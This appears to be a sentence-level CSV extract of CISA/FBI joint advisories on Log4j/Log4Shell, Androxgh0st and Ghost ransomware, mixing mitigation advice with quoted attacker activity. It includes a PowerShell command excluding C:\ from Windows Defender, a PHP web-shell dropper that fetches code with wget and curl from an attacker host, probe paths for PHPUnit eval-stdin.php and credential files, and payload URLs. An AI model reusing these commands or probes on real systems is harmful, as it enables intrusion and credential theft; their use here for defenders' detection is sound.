CAND_01075,R022,6,R022_P0002,R022_S000106,"• See the Apache Log4j Security Vulnerabilities webpage (as of December 22, 2021, the latest Log4j version is 2.17.0 for Java 8 and 2.12.3 for Java 7)."
CAND_01076,R022,6,R022_P0002,R022_S000109,"Note: if your organization is unable to immediately identify and patch vulnerable instances of Log4j, apply appropriate workarounds."
CAND_01077,R022,6,R022_P0002,R022_S000115,o NCC Group: log4j-jndi-be-gone: A simple mitigation for CVE-2021-44228 o Amazon AWS:  GitHub page: hotpatch-for-apache-log4j2  Blog: Hotpatch for Apache Log4j C.
CAND_01078,R022,6,R022_P0002,R022_S000116,Keep an inventory of known and suspected vulnerable assets and what is done with them throughout this process.
CAND_01079,R022,6,R022_P0002,R022_S000119,D.
CAND_01080,R022,6,R022_P0002,R022_S000121,(1) Scan the patched/mitigated asset with the tools and methods listed in step 1.B.
CAND_01081,R022,6,R022_P0002,R022_S000122,Use more than one method to verify the mitigation was successfully applied.
CAND_01082,R022,6,R022_P0002,R022_S000123,(2) Monitor the asset closely.
CAND_01083,R022,7,R022_P0001,R022_S000133,(1) Treat assets that use Log4j as suspect and conduct vigorous forensic investigation of those assets.
CAND_01084,R022,7,R022_P0001,R022_S000136,(4) Use CISA’s GitHub page to detect possible exploitation or compromise.
CAND_01085,R022,7,R022_P0001,R022_S000138,"Note: due to the urgency to share this information, CISA, the FBI, NSA, ACSC, CCCS, CERT NZ, NZ NCSC, and NCSC-UK have not yet validated this content."
CAND_01086,R022,7,R022_P0001,R022_S000142,"CISA, the FBI, NSA, ACSC, CCCS, CERT NZ, NZ NCSC, and NCSC-UK encourage organizations to see CISA’s Federal"
CAND_01087,R022,8,R022_P0002,R022_S000152,• New Zealand organizations can visit NCSC.govt.nz to report incidents.
CAND_01088,R022,8,R022_P0002,R022_S000153,"• UK organizations can report a significant cyber security incident at ncsc.gov.uk/report-an-incident (monitored 24 hrs) or, for urgent assistance, call 03000 200 973."
CAND_01089,R022,8,R022_P0003,R022_S000157,"Remain alert to changes from vendors for the software on the asset, and immediately apply updates to assets when notified by a vendor that their product has a patch for this vulnerability."
CAND_01090,R022,8,R022_P0003,R022_S000160,B.
CAND_01091,R022,8,R022_P0003,R022_S000169,Identify the software your enterprise uses and stay on top of updates as these may be superseded by other updates and fixes.
CAND_01092,R022,9,R022_P0003,R022_S000181,"Affected Organizations with OT/ICS Assets Due to the pervasiveness of the Apache Log4j software library—and the integration of the library in operational products—CISA, the FBI, NSA, ACSC, CCCS, CERT NZ, NZ NCSC, and NCSC-UK strongly recommend that OT asset owners and operators review their operational architecture and enumerate the vulnerability status against current product alerts and advisories."
CAND_01093,R022,9,R022_P0003,R022_S000182,"If a product does not have a security advisory specifically addressing the status of the vulnerability, treat it with additional protections."
CAND_01094,R022,9,R022_P0003,R022_S000186,"OT/ICS devices—if segmented appropriately from the IT environment—do not face the internet and, as such, have a smaller attack surface to this vulnerability."
CAND_01095,R022,9,R022_P0003,R022_S000194,Many OT/ICS-specific products incorporate vulnerable versions of the Log4j library.
CAND_01096,R022,10,R022_P0002,R022_S000200,4.
CAND_01097,R022,10,R022_P0002,R022_S000211,• U.S.
CAND_01098,R022,10,R022_P0002,R022_S000214,• Canadian organizations can report incidents by emailing CCCS at contact@cyber.gc.ca.
CAND_01099,R022,10,R022_P0002,R022_S000219,"CISA, the FBI, NSA, ACSC, CCCS, CERT NZ, NZ NCSC, and NCSC-UK encourage all organizations to verify information with trusted sources, such CISA, the FBI, NSA, ACSC, CCCS, CERT NZ, NZ NCSC, NCSC-UK, and vendors."
CAND_01100,R022,10,R022_P0002,R022_S000220,REFERENCES [1] Reddit: Log4j 0day being exploited
CAND_01101,R023,1,R023_P0002,R023_S000004,This document is marked TLP:CLEAR.
CAND_01102,R023,1,R023_P0002,R023_S000006,"Sources may use TLP:CLEAR when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release."
CAND_01103,R023,1,R023_P0002,R023_S000010,"In the course of incident response activities, CISA determined that cyber threat actors exploited the Log4Shell vulnerability in an unpatched VMware Horizon server, installed XMRig crypto mining software, moved laterally to the domain controller (DC), compromised credentials, and then implanted Ngrok reverse proxies on several hosts to maintain persistence."
CAND_01104,R023,1,R023_P0002,R023_S000012,"CISA and FBI are releasing this Cybersecurity Advisory (CSA) providing the suspected Iranian government-sponsored actors’ tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help network defenders detect and protect against related compromises."
CAND_01105,R023,1,R023_P0002,R023_S000015,"All organizations, regardless of identified evidence of compromise, should apply the recommendations in the Mitigations section of this CSA to protect against similar malicious cyber activity."
CAND_01106,R023,2,R023_P0002,R023_S000023,"In coordination with the FCEB organization, CISA initiated threat hunting incident response activities; however, prior to deploying an incident response team, CISA observed additional suspected APT activity."
CAND_01107,R023,2,R023_P0002,R023_S000027,CISA also observed a DNS query for us‐nation‐ny[.]cf that resolved back to 51.89.181[.]64 when the victim server was returning this Log4Shell LDAP callback to the actors’ server.
CAND_01108,R023,2,R023_P0002,R023_S000033,"As part of their initial exploitation, CISA observed a connection to known malicious IP address 182.54.217[.]2 lasting 17.6 seconds."
CAND_01109,R023,2,R023_P0002,R023_S000034,"The actors’ exploit payload ran the following PowerShell command [T1059.001] that added an exclusion tool to Windows Defender [T1562.001]: powershell try{Add-MpPreference -ExclusionPath 'C:\'; Write-Host 'added- exclusion'} catch {Write-Host 'adding-exclusion-failed' }; powershell -enc ""$BASE64 encoded payload to download next stage and execute it"""
CAND_01110,R023,3,R023_P0002,R023_S000037,The exploit payload then downloaded mdeploy.text from 182.54.217[.]2/mdepoy.txt to C:\users\public\mde.ps1 [T1105].
CAND_01111,R023,3,R023_P0002,R023_S000042,The exploit payload created a Scheduled Task [T1053.005] that executed RuntimeBroker.exe daily as SYSTEM.
CAND_01112,R023,3,R023_P0002,R023_S000043,"Note: By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access."
CAND_01113,R023,3,R023_P0002,R023_S000049,• Mimikatz – a credential theft tool.
CAND_01114,R023,3,R023_P0002,R023_S000051,"CISA has observed this tool in use by some commercial products for benign purposes; however, this process bypasses typical firewall controls and may be a potentially unwanted application in production environments."
CAND_01115,R023,3,R023_P0003,R023_S000054,"Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network."
CAND_01116,R023,3,R023_P0003,R023_S000055,"Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files."
CAND_01117,R023,4,R023_P0002,R023_S000066,Mitigation/Detection: Use a firewall or web-application firewall and enable logging to prevent and detect potential Log4Shell exploitation attempts [M1050].
CAND_01118,R023,5,R023_P0001,R023_S000068,``
CAND_01119,R023,5,R023_P0002,R023_S000073,Persistence Technique Title ID Use Recommendations Account Manipulation T1098 The actors changed the password for the local administrator account on several hosts.
CAND_01120,R023,6,R023_P0001,R023_S000080,``
CAND_01121,R023,6,R023_P0002,R023_S000088,Detection: Monitor for newly constructed processes and/or command-lines that execute from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows [DS0009] Detection: Monitor for newly constructed scheduled jobs by enabling the Microsoft-Windows- TaskScheduler/Operational setting within the event logging service [DS0003].
CAND_01122,R023,6,R023_P0002,R023_S000089,Valid Accounts: Default Accounts T1078.001 The actors used built-in Windows user account DefaultAccount.
CAND_01123,R023,7,R023_P0002,R023_S000092,CISA | FBI TLP:CLEAR Page 7 of 14 | Product ID: AA22-320A TLP:CLEAR Detection: Develop rules to monitor logon behavior across default accounts that have been activated or logged into [DS0028].
CAND_01124,R023,7,R023_P0002,R023_S000093,Defense Evasion Technique Title ID Use Recommendations Impair Defenses: Disable or Modify Tools
CAND_01125,R023,7,R023_P0003,R023_S000094,T1562.001 The actors added an exclusion tool to Windows Defender.
CAND_01126,R023,7,R023_P0003,R023_S000095,"The tool allowlisted the entire c:\drive, enabling the actors to bypass virus scans for tools they downloaded to the c:\drive."
CAND_01127,R023,7,R023_P0003,R023_S000098,[M1018].
CAND_01128,R023,7,R023_P0003,R023_S000099,Detection: Monitor for changes made to Windows Registry keys and/or values related to services and startup programs that correspond to security tools such as HKLM:\SOFTWARE\Policies\Micro soft\Windows Defender [DS0024].
CAND_01129,R023,7,R023_P0003,R023_S000100,Detection: Monitor for telemetry that provides context for modification or deletion of information related to security software processes or services such as Windows Defender definition files in Windows and System log files in Linux [DS0013].
CAND_01130,R023,8,R023_P0002,R023_S000108,"Mitigation: Ensure that local administrator accounts have complex, unique passwords across all systems on the network [M1027]."
CAND_01131,R023,8,R023_P0002,R023_S000109,Detection: Monitor for unexpected processes interacting with LSASS.exe.
CAND_01132,R023,8,R023_P0002,R023_S000110,"Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored."
CAND_01133,R023,10,R023_P0001,R023_S000122,``
CAND_01134,R023,10,R023_P0002,R023_S000124,System Network Configuration Discovery: Internet Connection Discovery T1016.001 The actors’ malware tests for internet connectivity by pinging 8.8.8.8.
CAND_01135,R023,10,R023_P0002,R023_S000127,Mitigation: Use MFA for remote logins [M1032].
CAND_01136,R023,10,R023_P0002,R023_S000129,Mitigation: Do not leave RDP accessible from the internet.
CAND_01137,R023,11,R023_P0002,R023_S000135,CISA | FBI TLP:CLEAR Page 11 of 14 | Product ID: AA22-320A TLP:CLEAR malicious behavior with RDP [DS0028].
CAND_01138,R023,11,R023_P0002,R023_S000136,Command and Control Technique Title ID Use Recommendations Proxy T1090 The actors used Ngrok to proxy RDP connections and to perform command and control.
CAND_01139,R023,11,R023_P0002,R023_S000139,"Ingress Tool Transfer T1105 The actors downloaded malware and multiple tools to the network, including PsExec, Mimikatz, and Ngrok."
CAND_01140,R023,12,R023_P0002,R023_S000163,Note that these temporary solutions should not be treated as permanent fixes; vulnerable components should be upgraded to the latest build as soon as possible.
CAND_01141,R023,12,R023_P0002,R023_S000167,• Keep all software up to date and prioritize patching known exploited vulnerabilities (KEVs).
CAND_01142,R023,13,R023_P0001,R023_S000171,``
CAND_01143,R023,13,R023_P0002,R023_S000180,"o Create non-privileged accounts for privileged users and ensure they use the non- privileged accounts for all non-privileged access (e.g., web browsing, email access)."
CAND_01144,R023,13,R023_P0002,R023_S000183,o Use virtualizing solutions on modern hardware and software to ensure credentials are securely stored.
CAND_01145,R023,13,R023_P0002,R023_S000184,o Ensure storage of clear text passwords in LSASS memory is disabled.
CAND_01146,R023,13,R023_P0002,R023_S000189,"For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA)."
CAND_01147,R023,14,R023_P0002,R023_S000195,CISA | FBI TLP:CLEAR Page 14 of 14 | Product ID: AA22-320A TLP:CLEAR To get started: 1.
CAND_01148,R023,14,R023_P0002,R023_S000196,Select an ATT&CK technique described in this advisory (see table 1).
CAND_01149,R023,14,R023_P0002,R023_S000204,Repeat the process for all security technologies to obtain a set of comprehensive performance data.
CAND_01150,R023,14,R023_P0002,R023_S000205,6.
CAND_01151,R024,1,R024_P0002,R024_S000002,"When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact."
CAND_01152,R024,1,R024_P0002,R024_S000003,"To request incident response resources or technical assistance related to these threats, contact CISA at report@cisa.dhs.gov."
CAND_01153,R024,1,R024_P0002,R024_S000004,This document is marked TLP:CLEAR.
CAND_01154,R024,1,R024_P0002,R024_S000005,Disclosure is not limited.
CAND_01155,R024,1,R024_P0002,R024_S000010,"Multiple, ongoing investigations and trusted third party reporting yielded the IOCs and TTPs, and provided information on Androxgh0st malware’s ability to establish a botnet that can further identify and compromise vulnerable networks."
CAND_01156,R024,1,R024_P0002,R024_S000012,"For a downloadable copy of IOCs, see: • AA24-016A (STIX XML, 46KB) • AA24-016A (STIX JSON, 40KB) TECHNICAL DETAILS Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14."
CAND_01157,R024,2,R024_P0002,R024_S000022,"In particular, threat actors deploying Androxgh0st have been observed exploiting CVE-2017-9841 to remotely run hypertext preprocessor (PHP) code on fallible websites via PHPUnit [T1190]."
CAND_01158,R024,2,R024_P0002,R024_S000023,Websites using the PHPUnit module that have internet- accessible (exposed) /vendor folders are subject to malicious HTTP POST requests to the /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php uniform resource identifier (URI).
CAND_01159,R024,2,R024_P0002,R024_S000024,"This PHP page runs PHP code submitted through a POST request, which allows the threat actors to remotely execute code."
CAND_01160,R024,2,R024_P0002,R024_S000028,Laravel Framework Targeting Androxgh0st malware establishes a botnet to scan for websites using the Laravel web application framework.
CAND_01161,R024,2,R024_P0002,R024_S000029,"After identifying websites using the Laravel web application, threat actors attempt to determine if the domain’s root-level .env file is exposed and contains credentials for accessing additional services."
CAND_01162,R024,2,R024_P0002,R024_S000032,"If the .env file is exposed, threat actors will issue a GET request to the /.env URI to attempt to access the data on the page."
CAND_01163,R024,2,R024_P0002,R024_S000033,"Alternatively, Androxgh0st may issue a POST request to the same URI with a POST variable named 0x[] containing certain data sent to the web server."
CAND_01164,R024,2,R024_P0002,R024_S000036,"A successful response from either of these methods allows the threat actors to look for usernames, passwords, and/or other credentials pertaining to services such as email (via SMTP) and AWS accounts."
CAND_01165,R024,3,R024_P0002,R024_S000037,FBI | CISA Page 3 of 13 | Product ID: AA24-016A TLP:CLEAR TLP:CLEAR Androxgh0st malware can also access the application key [TA0006] for the Laravel application on the website.
CAND_01166,R024,3,R024_P0002,R024_S000041,"In doing so, the threat actors can upload files to the website via remote access."
CAND_01167,R024,3,R024_P0002,R024_S000045,"If threat actors obtain credentials for any services using the above methods, they may use these credentials to access sensitive data or use these services to conduct additional malicious operations."
CAND_01168,R024,4,R024_P0002,R024_S000051,• /.aws/credentials • /aws/credentials • /.aws/config • /.git • /.test • /admin • /backend • /app • /current • /demo • /api • /backup • /beta • /cron • /develop • /Laravel • /laravel/core • /gists/cache • /test.php • /info.php • //.env • /admin-app/.env%20
CAND_01169,R024,6,R024_P0002,R024_S000053,FBI | CISA Page 6 of 13 | Product ID: AA24-016A TLP:CLEAR TLP:CLEAR • //wp-content/plugins/jekyll- exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //wp-content/plugins/mm- plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • //www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • /admin/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php • /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • /api/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php • /lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • /laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • /laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • /laravelao/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php • /lib/phpunit/phpunit/Util/PHP/eval-stdin.php • /lib/phpunit/phpunit/Util/PHP/eval • stdin.php%20/lib/phpunit/src/Util/PHP/eval-stdin.php • /lib/phpunit/src/Util/PHP/eval-stdin.php • /lib/phpunit/Util/PHP/eval-stdin.php • /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • /libraries/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • /phpunit/phpunit/src/Util/PHP/eval-stdin.php • /phpunit/phpunit/Util/PHP/eval-stdin.php • /phpunit/phpunit/Util/PHP/eval- stdin.php%20/phpunit/src/Util/PHP/evalstdin.php • /phpunit/src/Util/PHP/eval-stdin.php • ./phpunit/Util/PHP/eval-stdin.php • /phpunit/Util/PHP/eval-stdin.php%20/lib/phpunit/phpunit/src/Util/PHP/eval- stdin.php • /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php • /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php.dev • /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php • /vendor/phpunit/phpunit/Util/PHP/eval- stdin.php%20/vendor/phpunit/src/Util/PHP/eval-stdin.php • /vendor/phpunit/src/Util/PHP/eval-stdin.php • /vendor/phpunit/Util/PHP/eval-stdin.php • /vendor/phpunit/Util/PHP/eval-stdin.php%20 • /phpunit/phpunit/src/Util/PHP/eval-stdin.php • /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
CAND_01170,R024,7,R024_P0003,R024_S000055,"0x%5B%5D=androxgh0st An example of attempted web-shell drop through (honeypot) open proxies: GET http://www.example.com/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1 host: www.example.com user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76 accept-encoding: gzip, deflate accept: */* connection: keep-alive x-forwarded-for: 200.172.238.135 content-length: 279"
CAND_01171,R024,7,R024_P0004,R024_S000056,"<?php file_put_contents('evil.php',file_get_contents('hxxps://mc.rockylinux[.]si/seofor ce/triggers/files/evil.txt')); system('wget hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt -O evil.php;curl hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt -O evil.php'); ?> Monikers used instead of Androxgh0st (0x%5B%5D=???): • Ridho • Aws • 0x_0x • x_X • nopebee7 • SMTPEX • evileyes0 • privangga"
CAND_01172,R024,8,R024_P0005,R024_S000060,hxxps://pastebin[.]com/raw/zw0gAmpC ca45a14d0e88e4aa408a6ac2ee3012bf9994b16b74e3c66b588c7eabaaec4d72
CAND_01173,R024,8,R024_P0006,R024_S000061,hxxp://raw.githubusercontent[.]com/0x5a455553/MARIJUANA/master/MARIJUANA.php 0df17ad20bf796ed549c240856ac2bf9ceb19f21a8cae2dbd7d99369ecd317ef
CAND_01174,R024,8,R024_P0007,R024_S000062,hxxp://45.95.147[.]236/tmp.x86_64 6b5846f32d8009e6b54743d6f817f0c3519be6f370a0917bf455d3d114820bbc
CAND_01175,R024,8,R024_P0008,R024_S000063,hxxp://main.dsn[.]ovh/dns/pwer bb7070cbede294963328119d1145546c2e26709c5cea1d876d234b991682c0b7
CAND_01176,R024,9,R024_P0002,R024_S000065,FBI | CISA Page 9 of 13 | Product ID: AA24-016A TLP:CLEAR TLP:CLEAR MITRE ATT&CK TACTICS AND TECHNIQUES See Tables 1-10 for all referenced threat actor tactics and techniques in this advisory.
CAND_01177,R024,10,R024_P0002,R024_S000072,Server Software Component: Web Shell T1505.003 The threat actor deploys web shells to maintain persistent access to systems.
CAND_01178,R024,10,R024_P0002,R024_S000074,"Table 6: Defense Evasion Technique Title ID Use Obfuscated Files or Information: Command Obfuscation T1027.010 The threat actor can exploit a successfully identified Laravel application key to encrypt PHP code, which is then passed to the site as a value in the XSRF-TOKEN cookie."
CAND_01179,R024,10,R024_P0002,R024_S000075,Table 7: Credential Access Technique Title ID Use Credential Access TA0006 The threat actor can access the application key of the Laravel application on the site.
CAND_01180,R024,10,R024_P0002,R024_S000076,Unsecured Credentials: Credentials in Files T1552.001 The threat actor targets .env files that contain confidential credential information.
CAND_01181,R024,11,R024_P0002,R024_S000080,Table 10: Command and Control Technique Title ID Use Ingress Tool Transfer T1105 The threat actor runs PHP code through a POST request to download malicious files to the system hosting the website.
CAND_01182,R024,11,R024_P0002,R024_S000081,MITIGATIONS The FBI and CISA recommend implementing the mitigations below to improve your organization’s cybersecurity posture based on Androxgh0st threat actor activity.
CAND_01183,R024,11,R024_P0002,R024_S000082,These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST).
CAND_01184,R024,11,R024_P0002,R024_S000084,"CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures."
CAND_01185,R024,11,R024_P0002,R024_S000086,These mitigations apply to all critical infrastructure organizations and network defenders.
CAND_01186,R024,11,R024_P0002,R024_S000088,"For more information on secure by design, see CISA’s Secure by Design webpage."
CAND_01187,R024,11,R024_P0002,R024_S000090,"• Keep all operating systems, software, and firmware up to date."
CAND_01188,R024,11,R024_P0002,R024_S000092,Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to
CAND_01189,R024,12,R024_P0002,R024_S000101,"• Review outgoing GET requests (via cURL command) to file hosting sites such as GitHub, pastebin, etc., particularly when the request accesses a .php file."
CAND_01190,R024,12,R024_P0002,R024_S000102,"VALIDATE SECURITY CONTROLS In addition to applying mitigations, FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory."
CAND_01191,R024,12,R024_P0002,R024_S000104,To get started: 1.
CAND_01192,R024,12,R024_P0002,R024_S000107,Align your security technologies against the technique.
CAND_01193,R024,12,R024_P0002,R024_S000111,Analyze your detection and prevention technologies’ performance.
CAND_01194,R024,12,R024_P0002,R024_S000112,5.
CAND_01195,R024,12,R024_P0002,R024_S000113,Repeat the process for all security technologies to obtain a set of comprehensive performance data.
CAND_01196,R024,12,R024_P0002,R024_S000118,"With regards to specific information that appears in this CSA, indicators should always be evaluated in light of an organization’s complete security situation."
CAND_01197,R024,13,R024_P0002,R024_S000120,"Reports can be submitted to the FBI Internet Crime Complaint Center (IC3), a local FBI Field Office, or to CISA via its Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or (888) 282-0870."
CAND_01198,R024,13,R024_P0002,R024_S000121,"RESOURCES • CISA: Known Exploited Vulnerabilities Catalog • CISA, MITRE: Best Practices for MITRE ATT&CK Mapping • CISA: Decider Tool • NIST: CVE-2017-9841 • NIST: CVE-2018-15133 • NIST: CVE-2021-41773 • CISA: Cross-Sector Cybersecurity Performance Goals • CISA: Secure by Design REFERENCES [1] Fortinet - FortiGuard Labs: Threat Signal Report: AndroxGh0st Malware Actively Used in the Wild ACKNOWLEDGEMENTS Amazon contributed to this CSA."
CAND_01199,R024,13,R024_P0002,R024_S000122,DISCLAIMER The information in this report is being provided “as is” for informational purposes only.
CAND_01200,R024,13,R024_P0002,R024_S000123,"FBI and CISA do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document."
CAND_01201,R025,1,R025_P0001,R025_S000002,"organizations: To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact your local FBI field office or CISA’s 24/7 Operations Center at Report@cisa.gov or (888) 282- 0870."
CAND_01202,R025,1,R025_P0001,R025_S000007,"Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction."
CAND_01203,R025,1,R025_P0001,R025_S000012, Segment networks to restrict lateral movement from initial infected devices and other devices in the same organization [CPG 2.F].
CAND_01204,R025,1,R025_P0001,R025_S000013, Require Phishing-Resistant MFA for access to all privileged accounts and email services accounts.
CAND_01205,R025,1,R025_P0001,R025_S000015,"These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware."
CAND_01206,R025,2,R025_P0001,R025_S000026,Ghost actors use publicly available code to exploit Common Vulnerabilities and Exposures (CVEs) and gain access to internet facing servers.
CAND_01207,R025,2,R025_P0001,R025_S000027,Ghost actors exploit well known vulnerabilities and target networks where available patches have not been applied.
CAND_01208,R025,2,R025_P0001,R025_S000029,"For a downloadable copy of IOCs, see:  AA25-050A STIX XML (79KB)  AA25-050A STIX XML (Additional IOCs) (74KB)  AA25-050A STIX JSON (68KB) Technical Details Note: This advisory uses the MITRE ATT&CK® Matrix for Enterprise framework, version 16.1."
CAND_01209,R025,2,R025_P0001,R025_S000030,See the MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques.
CAND_01210,R025,2,R025_P0001,R025_S000031,Initial Access The FBI has observed Ghost actors obtaining initial access to networks by exploiting public facing applications that are associated with multiple CVEs [T1190].
CAND_01211,R025,2,R025_P0001,R025_S000033,Execution Ghost actors have been observed uploading a web shell [T1505.003] to a compromised server and leveraging Windows Command Prompt [T1059.003] and/or PowerShell [T1059.001] to download and execute Cobalt Strike Beacon malware [T1105] that is then implanted on victim systems.
CAND_01212,R025,2,R025_P0001,R025_S000034,Despite Ghost
CAND_01213,R025,3,R025_P0001,R025_S000041,"Ghost actors have been observed using multiple open-source tools in an attempt at privilege escalation through exploitation [T1068] such as “SharpZeroLogon,” “SharpGPPPass,” “BadPotato,” and “GodPotato.” These privilege escalation tools would not generally be used by individuals with legitimate access and credentials."
CAND_01214,R025,3,R025_P0001,R025_S000044,Defense Evasion Ghost actors used their access through Cobalt Strike to display a list of running processes [T1057] to determine which antivirus software [T1518.001] is running so that it can be disabled [T1562.001].
CAND_01215,R025,4,R025_P0001,R025_S000050,"This string decodes to “$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(“” and is involved with the execution of Cobalt Strike in memory on the target machine."
CAND_01216,R025,4,R025_P0001,R025_S000051,"In cases where lateral movement attempts are unsuccessful, Ghost actors have been observed abandoning an attack on a victim."
CAND_01217,R025,4,R025_P0001,R025_S000057,"Command and Control Ghost actors rely heavily on Cobalt Strike Beacon malware and Cobalt Strike Team Servers for command and control (C2) operations, which function using hypertext transfer protocol (HTTP) and hypertext transfer protocol secure (HTTPS) [T1071.001]."
CAND_01218,R025,4,R025_P0001,R025_S000059,"Instead, connections made to a uniform resource identifier (URI) of a C2 server, for the purpose of downloading and executing Beacon malware, directly reference the C2 server’s IP address."
CAND_01219,R025,5,R025_P0001,R025_S000072,The impact of Ghost ransomware activity varies widely on a victim-to-victim basis.
CAND_01220,R025,5,R025_P0001,R025_S000073,"Ghost actors tend to move to other targets when confronted with hardened systems, such as those where proper network segmentation prevents lateral moment to other devices."
CAND_01221,R025,5,R025_P0001,R025_S000074,Indicators of Compromise (IOC) Table 1 lists several tools and applications Ghost actors have used for their operations.
CAND_01222,R025,5,R025_P0001,R025_S000075,The use of these tools and applications on a network should be investigated further.
CAND_01223,R025,5,R025_P0001,R025_S000078,Ghost actors use an unauthorized version of Cobalt Strike.
CAND_01224,R025,5,R025_P0001,R025_S000083,github[.]com/leitosama/SharpZeroLogon
CAND_01225,R025,6,R025_P0001,R025_S000085,"N/A SpnDump.exe SpnDump.exe is used to list service principal name identifiers, which Ghost actors use for service and hostname enumeration."
CAND_01226,R025,8,R025_P0001,R025_S000101,"Table 5: Execution Technique Title ID Use Windows Management Instrumentation T1047 Ghost actors abuse WMI to run PowerShell scripts on other devices, resulting in their infection with Cobalt Strike Beacon malware."
CAND_01227,R025,8,R025_P0001,R025_S000102,PowerShell T1059.001 Ghost actors use PowerShell for various functions including to deploy Cobalt Strike.
CAND_01228,R025,9,R025_P0001,R025_S000103,TLP:CLEAR FBI | CISA | MS-ISAC Page 9 of 13 | Product ID: AA25-050A TLP:CLEAR Technique Title ID Use Windows Command Shell T1059.003 Ghost actors use the Windows Command Shell to download malicious content on to victim servers.
CAND_01229,R025,9,R025_P0001,R025_S000104,Table 6: Persistence Technique Title ID Use Account Manipulation T1098 Ghost actors change passwords for already established accounts.
CAND_01230,R025,9,R025_P0001,R025_S000106,Domain Account T1136.002 Ghost actors create new accounts or makes modifications to domain accounts.
CAND_01231,R025,9,R025_P0001,R025_S000111,Impair Defenses: Disable or Modify Tools T1562.001 Ghost actors disable antivirus products.
CAND_01232,R025,10,R025_P0001,R025_S000112,TLP:CLEAR FBI | CISA | MS-ISAC Page 10 of 13 | Product ID: AA25-050A TLP:CLEAR Technique Title ID Use Hidden Window T1564.003 Ghost actors use PowerShell to conceal malicious content within legitimate appearing command windows.
CAND_01233,R025,10,R025_P0001,R025_S000114,Table 10: Discovery Technique Title ID Use Remote System Discovery T1018 Ghost actors use tools like Ladon 911 and ShapNBTScan for remote systems discovery.
CAND_01234,R025,10,R025_P0001,R025_S000117,Network Share Discovery T1135 Ghost actors use various tools for network share discovery for the purpose of host enumeration.
CAND_01235,R025,10,R025_P0001,R025_S000118,Software Discovery T1518 Ghost actors use their access to determine which antivirus software is running.
CAND_01236,R025,11,R025_P0001,R025_S000122,TLP:CLEAR FBI | CISA | MS-ISAC Page 11 of 13 | Product ID: AA25-050A TLP:CLEAR Table 12: Command and Control Technique Title ID Use Web Protocols T1071.001 Ghost actors use Cobalt Strike Beacon malware and Cobalt Strike Team Servers which communicate over HTTP and HTTPS.
CAND_01237,R025,11,R025_P0001,R025_S000129,These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST).
CAND_01238,R025,11,R025_P0001,R025_S000133, Maintain regular system backups that are known-good and stored offline or are segmented from source systems [CPG 2.R].
CAND_01239,R025,12,R025_P0001,R025_S000137, Require Phishing-Resistant MFA for access to all privileged accounts and email services accounts.
CAND_01240,R025,12,R025_P0001,R025_S000139, Monitor for unauthorized use of PowerShell.
CAND_01241,R025,12,R025_P0001,R025_S000140,"Ghost actors leverage PowerShell for malicious purposes, although it is often a helpful tool that is used by administrators and defenders to manage system resources."
CAND_01242,R025,12,R025_P0001,R025_S000144," Identify, alert on, and investigate abnormal network activity."
CAND_01243,R025,12,R025_P0001,R025_S000148,"o Ghost actors run a significant number of commands, scripts, and programs that IT administrators would have no legitimate reason for running."
CAND_01244,R025,12,R025_P0001,R025_S000150," Limit exposure of services by disabling unused ports such as, RDP 3398, FTP 21, and SMB 445, and restricting access to essential services through securely configured VPNs or firewalls."
